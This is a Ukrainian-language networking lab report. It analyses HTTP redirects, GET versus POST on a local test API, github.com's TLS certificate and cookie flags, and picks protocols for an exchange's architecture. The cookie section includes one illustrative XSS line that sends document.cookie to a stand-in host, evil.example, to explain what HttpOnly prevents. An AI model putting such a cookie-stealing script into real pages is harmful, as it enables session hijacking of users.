## Завдання 1. Аналіз HTTP-заголовків та статус-кодів

Замість `google.com` досліджено `github.com`.

### Команда

```bash
curl -I http://github.com
```

### Результат

```
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Location: https://github.com/
```

Для порівняння — той самий запит одразу на HTTPS:

```bash
curl -I https://github.com
```
```
HTTP/2 200
date: Mon, 19 Oct 2026 16:38:28 GMT
content-type: text/html; charset=utf-8
```

### Аналіз

- **Статус-код:** `301 Moved Permanently` — ресурс назавжди переміщено за іншою адресою. Клієнт (браузер)
  має запам'ятати це і надалі одразу звертатись за новою адресою; пошукові системи переносять «вагу»
  сторінки на нову URL. Клас 3xx — перенаправлення.
- **Location:** `https://github.com/`. Редирект з `http://` на `https://` — примусове використання
  захищеного з'єднання. GitHub не обслуговує контент по незашифрованому HTTP: єдине, що робить порт 80 —
  відправляє клієнта на HTTPS (тіло відповіді порожнє, `Content-Length: 0`).
- **Версія протоколу:** на HTTP (порт 80) сервер відповів `HTTP/1.1`. На HTTPS той самий сервер узгодив
  `HTTP/2` — через TLS-розширення ALPN клієнт і сервер домовились про новішу версію. Без TLS `curl` HTTP/2
  не використовує, тому на порту 80 бачимо 1.1.

## Завдання 2. Робота з методами HTTP

JSONPlaceholder використовувати не можна, тому тестовий API розгорнуто локально: невеликий Python-сервер,
який на `POST /items` створює ресурс і повертає `201 Created`, а на `GET /items` повертає список.

### Код тестового API (`api.py`)

```python
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

items = []

class API(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(items).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Cache-Control", "max-age=60")
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode()
        item = {"id": len(items) + 1, "data": raw}
        items.append(item)
        body = json.dumps(item).encode()
        self.send_response(201)
        self.send_header("Content-Type", "application/json")
        self.send_header("Location", f"/items/{item['id']}")
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("127.0.0.1", 8081), API).serve_forever()
```

```bash
python3 api.py &
```

### Створення ресурсу (POST)

```bash
curl -i -X POST -d "title=foo&body=bar&userId=1" http://127.0.0.1:8081/items
```
```
HTTP/1.0 201 Created
Server: BaseHTTP/0.6 Python/3.14.8
Date: Mon, 19 Oct 2026 16:38:44 GMT
Content-Type: application/json
Location: /items/1

{"id": 1, "data": "title=foo&body=bar&userId=1"}
```

**Статус-код успішного створення ресурсу: `201 Created`.** Сервер підтверджує, що новий ресурс створено,
і в заголовку `Location` повідомляє його адресу (`/items/1`).

### Читання ресурсу (GET) для порівняння

```bash
curl -i "http://127.0.0.1:8081/items?userId=1"
```
```
HTTP/1.0 200 OK
Content-Type: application/json
Cache-Control: max-age=60

[{"id": 1, "data": "title=foo&body=bar&userId=1"}]
```

### Що саме відправляє curl (вивід `curl -v`, рядки з `>`)

```
GET /items?userId=1 HTTP/1.1          ← дані в URL (query string), тіла немає
Host: 127.0.0.1:8081

POST /items HTTP/1.1                   ← дані в тілі запиту
Host: 127.0.0.1:8081
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

title=foo&body=bar&userId=1
```

### Різниця між POST і GET

| | GET | POST |
|---|---|---|
| **Призначення** | отримати ресурс | створити ресурс / відправити дані на обробку |
| **Де передаються дані** | у URL, після `?` (query string): `/items?userId=1` | у тілі запиту; URL лишається чистим, є `Content-Type` і `Content-Length` |
| **Обмеження розміру** | URL обмежений (зазвичай ~2–8 КБ), тільки текст | практично без обмежень, будь-який тип (JSON, файли, бінарні дані) |
| **Кешування** | **так** — відповідь може кешуватись браузером, проксі, CDN (`Cache-Control: max-age=60` у прикладі) | **ні** за замовчуванням — кожен запит виконується заново |
| **Ідемпотентність** | ідемпотентний і безпечний: повторний запит не змінює стан сервера | не ідемпотентний: два однакових POST створять два ресурси (`/items/1`, `/items/2`) |
| **Історія/логи/закладки** | параметри видно в історії браузера, логах сервера і проксі, можна зберегти в закладки | тіло в логи й історію не потрапляє; браузер при оновленні сторінки попереджає про повторну відправку |
| **Типова відповідь** | `200 OK` | `201 Created` + `Location` |

Висновок: дані GET «живуть» в адресі і можуть кешуватись, тому GET годиться лише для читання. Дані POST
«живуть» у тілі, не кешуються й змінюють стан сервера, тому саме POST використовують для створення ресурсів
і передачі чутливих даних (паролів, форм).

## Завдання 3. Перевірка TLS-сертифіката

Замість `google.com` досліджено `github.com`.

### Команда

```bash
openssl s_client -connect github.com:443 -servername github.com
```

### Результат (ключові рядки)

```
subject=CN=github.com
issuer=C=GB, O=Sectigo Limited, CN=Sectigo Public Server Authentication CA DV E36
Peer signing digest: SHA256
Peer signature type: ecdsa_secp256r1_sha256
New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256
Protocol: TLSv1.3
Verify return code: 0 (ok)
```

### Аналіз

- **Issuer (хто видав сертифікат):** `Sectigo Limited` (Велика Британія), проміжний центр сертифікації
  `Sectigo Public Server Authentication CA DV E36`. `DV` означає Domain Validation — підтверджено лише
  володіння доменом; `E` — ECDSA-ключ. Сертифікат виданий для `CN=github.com`.
- **Узгоджений протокол:** `TLSv1.3` — найновіша версія TLS. Handshake коротший (1-RTT), застарілі шифри
  прибрані, обмін ключами лише через ефемерний Діффі–Геллман (forward secrecy за замовчуванням).
- **Cipher Suite:** `TLS_AES_128_GCM_SHA256` — шифрування AES-128 у режимі GCM (авторизоване шифрування,
  одночасно конфіденційність і цілісність), SHA-256 для HKDF-виведення ключів. У TLS 1.3 назва шифру вже не
  містить алгоритму обміну ключами та підпису: підпис сервера — `ecdsa_secp256r1_sha256` (окремий рядок).
- `Verify return code: 0 (ok)` — ланцюжок довіри перевірено до кореневого сертифіката в системному сховищі,
  сертифікат дійсний і відповідає домену.
- Прапорець `-servername` передає SNI (Server Name Indication), щоб сервер, який обслуговує кілька доменів
  на одній IP-адресі, віддав саме сертифікат `github.com`.

## Завдання 4. Аналіз безпеки Cookies

### Команда

```bash
curl -I https://github.com | grep -i '^set-cookie'
```
(те саме видно у DevTools → Network → запит до `github.com` → вкладка Headers → `Set-Cookie`, або в
DevTools → Application → Cookies).

### Результат (значення скорочено)

```
set-cookie: _gh_sess=epvvleggRO…; path=/; HttpOnly; secure; SameSite=Lax
set-cookie: _octo=GH1.1.2110…; expires=Tue, 19 Oct 2027 16:38:33 GMT; domain=.github.com; path=/; secure; SameSite=Lax
set-cookie: logged_in=no; expires=Tue, 19 Oct 2027 16:38:33 GMT; domain=.github.com; path=/; HttpOnly; secure; SameSite=Lax
```

### Cookie та їх атрибути

| Cookie | Призначення | HttpOnly | Secure | SameSite | Інше |
|---|---|---|---|---|---|
| `_gh_sess` | ідентифікатор сесії (session ID) | ✅ | ✅ | `Lax` | без `expires` → сесійна, зникає із закриттям браузера |
| `_octo` | ідентифікатор клієнта для аналітики | ❌ | ✅ | `Lax` | живе 1 рік, `domain=.github.com` — для всіх піддоменів |
| `logged_in` | прапорець «користувач увійшов» | ✅ | ✅ | `Lax` | живе 1 рік |

### Від чого захищає HttpOnly

`HttpOnly` забороняє доступ до cookie з JavaScript: `document.cookie` її не бачить, браузер додає її лише до
HTTP-запитів. Це захист від **XSS (Cross-Site Scripting) — крадіжки сесії**. Якщо зловмисник зміг
впровадити на сторінку свій скрипт (через невалідований коментар, вразливий параметр тощо), без `HttpOnly`
скрипт зробив би `fetch('https://evil.example/?c=' + document.cookie)` і отримав `_gh_sess`, тобто
повністю перехопив би сесію користувача без пароля. З `HttpOnly` скрипт cookie прочитати не може, тож
навіть за наявності XSS session ID не витікає. Саме тому сесійна `_gh_sess` і `logged_in` мають `HttpOnly`,
а аналітична `_octo` — ні (її значення JS-коду сайту потрібне, і її крадіжка нічого не дає).

### Роль атрибута Secure

`Secure` дозволяє браузеру відправляти cookie **лише через HTTPS**. Якщо користувач або шкідливий скрипт
звернеться до `http://github.com/`, cookie в запит не потрапить. Це захист від **перехоплення в каналі
(sniffing / MITM)**: у відкритій Wi-Fi-мережі зловмисник, який бачить трафік, не отримає session ID, бо він
ніколи не передається у відкритому вигляді. Без `Secure` одного примусового HTTP-запиту (наприклад,
підставленої картинки `<img src="http://github.com/x">`) вистачило б, щоб cookie пішла незашифрованою.

Додатково **`SameSite=Lax`** забороняє відправляти cookie з крос-сайтових запитів, ініційованих іншим
сайтом (POST-форми, `fetch`, iframe), але дозволяє при звичайному переході за посиланням. Це захист від
**CSRF (Cross-Site Request Forgery)** — коли чужий сайт змушує браузер виконати дію на GitHub від імені
залогіненого користувача.

## Завдання 5. Архітектурне моделювання (кейс: онлайн-біржа)

### Сценарій А. Оновлення графіків цін у браузері в реальному часі

**Вибір: WebSocket (wss://) поверх TLS**, з серверним push і бінарним або компактним JSON-форматом повідомлень.

Обґрунтування:

- **Напрямок потоку.** Ціни змінюються щосекунди і частіше, ініціатор — сервер. HTTP-polling (запит щосекунди)
  дає затримку до інтервалу опитування, зайві заголовки (~500 байт на запит) і навантаження на сервер
  тисячами порожніх відповідей. WebSocket відкриває одне постійне двонаправлене TCP-з'єднання після HTTP
  `101 Switching Protocols`, далі сервер надсилає кадри одразу при зміні ціни, без заголовків, із накладними
  витратами 2–6 байт на кадр.
- **Двонаправленість.** Користувач з того самого з'єднання підписується/відписується від тікерів, виставляє
  заявки. SSE (Server-Sent Events) теж підходить для односпрямованого потоку котирувань і простіший
  (звичайний HTTP, автоматичний reconnect), але він лише сервер→клієнт і лише текст; для торгового
  термінала це обмеження.
- **Підтримка в браузері.** WebSocket є в усіх браузерах нативно, проходить через проксі й firewall як
  HTTPS (порт 443), не потребує плагінів. gRPC у браузері напряму не працює (немає доступу до HTTP/2
  фреймів), потрібен grpc-web із проксі; «сирий» UDP з браузера недоступний (WebRTC DataChannel можливий,
  але надмірно складний для цієї задачі).
- **Масштабування.** Fan-out «одна ціна → тисячі клієнтів» робить брокер повідомлень (Redis Pub/Sub, Kafka,
  NATS) за WebSocket-шлюзом; клієнтам можна агрегувати оновлення (throttle до 100–250 мс), бо графік
  частіше за кадр екрана перемальовувати не має сенсу.
- **Що з надійністю.** WebSocket працює поверх TCP, тож доставка впорядкована і гарантована. Для котирувань
  втрата пакета не критична (прийде наступна ціна), але TCP тут не шкодить, а HTTPS-сумісність важливіша.

### Сценарій Б. Взаємодія між внутрішніми мікросервісами (білінг ↔ облік акцій)

**Вибір: gRPC (HTTP/2 + Protocol Buffers) з mTLS** для синхронних викликів; для подій, які не потребують
негайної відповіді — брокер повідомлень (Kafka/NATS) у доповнення.

Обґрунтування:

- **Мінімальна затримка.** gRPC використовує HTTP/2: одне постійне з'єднання, мультиплексування багатьох
  викликів без head-of-line blocking на рівні HTTP, стиснення заголовків (HPACK). Protobuf — бінарна
  серіалізація, у 3–10 разів компактніша за JSON і значно швидша в парсингу. Порівняно з REST/JSON через
  HTTP/1.1 це дає нижчу затримку та менше CPU на серіалізацію, що важливо при тисячах операцій на секунду.
- **Строгий контракт.** Білінг і облік акцій оперують грошима й кількістю паперів, помилка типу чи поля
  неприпустима. `.proto`-схема генерує типізований код для клієнта і сервера, версіонується, зворотно
  сумісна (нові поля не ламають старих клієнтів).
- **Семантика викликів.** gRPC має unary-виклики (списати кошти → отримати підтвердження), а також
  streaming в обидва боки (потік угод для звірки). Вбудовані дедлайни (`deadline`), скасування, retry та
  статус-коди роблять поведінку при збоях передбачуваною, що критично для фінансових операцій.
- **Чому не REST/JSON.** Працює, але повільніше й без контракту «з коробки»; виправдано лише для зовнішнього
  публічного API, де важлива читабельність і сумісність з будь-яким клієнтом.
- **Чому не «сирий» UDP/TCP із власним протоколом.** Мінімальна можлива затримка, але доведеться самим
  писати фреймінг, повторні відправки, автентифікацію, спостережуваність. Виправдано хіба для
  high-frequency trading ядра матчінгу, а не для білінг↔облік.
- **Асинхронні події.** Не всі взаємодії потребують відповіді «тут і зараз»: наприклад, «угода виконана →
  нарахувати комісію» краще публікувати в Kafka/NATS. Це розв'язує сервіси, дає буфер при піках і гарантує
  доставку при тимчасовому падінні споживача. Синхронний gRPC лишається там, де потрібна негайна відповідь
  (перевірка балансу перед угодою).
- **Безпека.** Внутрішній трафік шифрується і взаємно автентифікується через mTLS (кожен сервіс має власний
  сертифікат), зазвичай через service mesh (Istio/Linkerd), яка додає ще retry, таймаути та трасування.

### Підсумок

| Сценарій | Протокол | Ключова причина |
|---|---|---|
| А: графіки в браузері | WebSocket (wss) | серверний push без polling, двонаправленість, нативна підтримка браузерами |
| Б: білінг ↔ облік | gRPC (HTTP/2 + Protobuf) + Kafka/NATS для подій | мінімальна затримка, бінарний формат, строгий контракт, дедлайни та retry |
